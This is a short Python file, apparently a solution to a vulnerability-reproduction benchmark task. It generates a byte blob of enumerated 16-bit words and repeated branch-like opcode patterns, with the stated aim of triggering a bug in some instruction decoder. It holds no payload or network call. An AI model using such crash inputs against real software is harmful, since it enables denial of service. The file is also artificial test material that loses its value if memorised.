import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        ba = bytearray()

        # Enumerate a range of 16-bit words in little-endian and big-endian to cover diverse opcodes
        for v in range(4096):
            ba += struct.pack('<H', v)
        for v in range(4096):
            ba += struct.pack('>H', v)

        # Pattern pairs designed to exercise branch-like and edge-case decodings
        patterns = [
            (0xE000, 0x0000),
            (0xE7FF, 0xFFFF),
            (0xFFFF, 0xFFFF),
            (0x0000, 0x0000),
            (0xAAAA, 0x5555),
            (0x5555, 0xAAAA),
            (0xF0F0, 0x0F0F),
            (0x0F0F, 0xF0F0),
            (0xD000, 0x0000),
            (0xDFFF, 0x7FFF),
            (0xC000, 0x1234),
            (0xB000, 0x4321),
        ]

        # Repeat patterns to increase likelihood of triggering the vulnerability
        for _ in range(512):
            for a, b in patterns:
                ba += struct.pack('<HH', a, b)
        for _ in range(256):
            for a, b in patterns:
                ba += struct.pack('>HH', a, b)

        return bytes(ba)